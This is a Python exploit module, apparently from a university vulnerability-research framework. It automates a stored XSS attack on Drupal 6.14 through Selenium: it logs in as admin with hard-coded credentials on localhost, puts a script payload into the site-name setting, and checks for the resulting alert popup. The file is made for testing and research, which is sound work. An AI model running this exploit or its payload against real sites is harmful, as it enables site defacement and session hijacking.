
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import time

from selenium.common.exceptions import NoAlertPresentException

import framework

# POC: http://www.exploit-db.com/exploits/18791/

class Exploit (framework.Exploit):

    attributes = {'Name' :        "DRUPAL_DP0001",
                  'Description' : "Drupal 5.20 and 6.14 (Core) XSS Vulnerabilities",
                  'References' :  [],
                  'Target' :      "Drupal 6.14",
                  'TargetLicense' : '',
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/Drupal_6.14",
                  'Type' : 'XSS',
                  'Privileged' : True
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            
    def exploit(self):
        self.logger.info("Running Exploit()")
        payload = "</title><script>alert(\'xss\');</script>"

        driver = self.create_selenium_driver()
        driver.get("http://localhost/drupal/")
        self.logger.info("Page opened successfully: %s", driver.title)

        driver.get_element(by_id="edit-name").send_keys("drupaladmin")
        driver.get_element(by_id="edit-pass").send_keys("drupaladminpw21")
        driver.get_element(by_id="edit-submit").click()

        self.logger.info("Changing site name...") 
        driver.get("http://localhost/drupal/?q=admin/settings/site-information")

        
        edit_name = driver.get_element(by_id="edit-site-name")
        edit_name.clear()
        edit_name.send_keys(payload)
        driver.get_element(by_id="edit-submit").click()
        self.logger.info("Payload sent")
        self.logger.info("visit http://localhost/drupal/ to see XSS")

        driver.cleanup()
        return

    def verify(self):
        verified = False
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/drupal/")
        
        try:
            driver.get_alert()
            self.logger.info("XSS popup comfirmed")
            verified = True
        except NoAlertPresentException:
            self.logger.error("XSS failed")
        

        driver.cleanup()
        return verified
